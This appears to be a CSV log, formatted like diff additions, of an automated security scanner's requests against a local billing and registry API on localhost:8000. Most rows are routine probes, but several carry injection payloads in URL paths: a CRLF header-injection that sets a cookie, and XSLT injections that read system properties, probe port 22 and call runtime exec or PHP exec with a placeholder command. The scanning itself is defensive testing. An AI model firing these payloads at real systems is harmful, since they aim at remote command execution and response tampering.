+13771,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/any%3F%0D%0ASet-cookie%3A+Tamper%3Dbfab97fe-a2d2-4b47-afdb-1a2693c088df%0D%0A/service-rules,422,Unprocessable Entity,1,206,254
+13772,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13773,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13774,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13775,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13776,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,1,206,261
+13777,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13778,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13779,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13780,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,0,195,185
+13781,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/actuator/health,404,Not Found,1,195,185
+13782,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13783,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/actuator/health,404,Not Found,0,195,185
+13784,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13785,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13786,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13787,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13788,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,1,206,263
+13789,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13790,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,1,206,273
+13791,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,0,217,195
+13792,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13793,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3C,422,Unprocessable Entity,2,206,261
+13794,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13795,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E,404,Not Found,1,195,185
+13796,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/system-property%28%27xsl%3Avendor%27%29%2F%3E,404,Not Found,1,195,185
+13797,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,2,206,263
+13798,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,1,195,185
+13799,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--,404,Not Found,1,195,185
+13800,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E,404,Not Found,1,195,185
+13801,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3C/service-rules,422,Unprocessable Entity,3,206,263
+13802,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E,404,Not Found,1,195,185
+13803,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E/service-rules,404,Not Found,1,195,185
+13804,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E,404,Not Found,1,195,185
+13805,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/system-property%28%27xsl%3Avendor%27%29%2F%3E/service-rules,404,Not Found,1,195,185
+13806,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%22%2F%3E%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--/service-rules,404,Not Found,0,195,185
+13807,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Cxsl%3Avalue-of+select%3D%22system-property%28%27xsl%3Avendor%27%29%22%2F%3E%3C%21--/service-rules,404,Not Found,1,195,185
+13808,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Cxsl%3Avalue-of+select%3D%22document%28%27http%3A%2F%2Flocalhost%3A22%27%29%22%2F%3E/service-rules,404,Not Found,1,195,185
+13809,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Cxsl%3Avariable+name%3D%22rtobject%22+select%3D%22runtime%3AgetRuntime%28%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22process%22+select%3D%22runtime%3Aexec%28%24rtobject%2C%27erroneous_command%27%29%22%2F%3E%0A%3Cxsl%3Avariable+name%3D%22waiting%22+select%3D%22process%3AwaitFor%28%24process%29%22%2F%3E%0A%3Cxsl%3Avalue-of+select%3D%22%24process%22%2F%3E/service-rules,404,Not Found,0,195,185
+13810,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/%3Cxsl%3Avalue-of+select%3D%22php%3Afunction%28%27exec%27%2C%27erroneous_command+2%3E%26amp%3B1%27%29%22%2F%3E/service-rules,404,Not Found,1,195,185
+13811,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13812,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13813,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,2,217,195
+13814,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13815,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,4,188,637
+13816,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,5,206,263
+13817,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,2,195,185
+13818,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,3,206,273
+13819,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13820,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13821,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,2,188,637
+13822,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,3,206,263
+13823,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13824,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,2,206,273
+13825,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,1,217,195
+13826,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,2,206,261
+13827,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,3,188,637
+13828,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,3,206,263
+13829,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000,404,Not Found,1,195,185
+13830,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing,422,Unprocessable Entity,3,206,273
+13831,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger-ui/,404,Not Found,1,195,185
+13832,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v3/api-docs,404,Not Found,1,195,185
+13833,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger.json,404,Not Found,2,195,185
+13834,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items,405,Method Not Allowed,2,217,195
+13835,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/openapi.json,200,OK,3,190,28107
+13836,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/billing/items/item_uuid,422,Unprocessable Entity,3,206,261
+13837,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/api-docs,404,Not Found,1,195,185
+13838,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/docs/,307,Temporary Redirect,3,208,0
+13839,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger,404,Not Found,2,195,185
+13840,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v2/api-docs,404,Not Found,3,195,185
+13841,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients,200,OK,6,188,637
+13842,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger-ui/index.html,404,Not Found,2,195,185
+13843,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/openapi.yaml,404,Not Found,2,195,185
+13844,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger.yaml,404,Not Found,1,195,185
+13845,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/swagger/ui/index.html,404,Not Found,1,195,185
+13846,Wed Nov 11 20:47:15 BRT 2026,Wed Nov 11 20:47:15 BRT 2026,GET,http://localhost:8000/v1/registry/clients/client_uuid/service-rules,422,Unprocessable Entity,4,206,263
